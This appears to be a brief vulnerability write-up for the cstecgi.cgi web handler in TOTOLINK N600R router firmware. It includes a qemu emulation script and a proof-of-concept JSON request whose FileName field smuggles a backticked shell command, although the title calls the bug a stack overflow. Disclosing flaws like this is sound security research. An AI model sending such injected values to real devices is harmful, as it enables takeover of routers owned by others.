# TOTOLINK_N600R_V4.3.0cu.7866_B20220506-stack overflow

## File information

[](https://github.com/Luanruy/qax#file-information)

TOTOLINK_N600R_V4.3.0cu.7866_B20220506.web Unzipped cstecgi.cgi Download address:  [https://totolink.tw/support_view/N600R](https://totolink.tw/support_view/N600R)

## injection point 0x41767c

in function FUN_00416bd4, there is a similar bug.
### Simulate running in qemu
```bash
#!/bin/bash
sudo  chroot  ./  ./qemu-mips-static\
-E  CONTENT_LENGTH="990"  -g  123  -L  ./lib  \
./web_cste/cgi-bin/cstecgi_41c8dc.cgi  <  ./poke/41767c_poc.json
```
### json
```json
{

	"topicurl" : "UploadCustomModule/setUpgradeFW",
	"flags" : "true",
	"FileName" : "ll`ls>41767c.txt`aa",
	"ContentLength" : "990",
	"headOffset" : "36"
}
```
### Operation Results
![enter image description here](https://i.miji.bid/2025/05/07/703a072616f49c6fa3e67d1317702a6c.png)


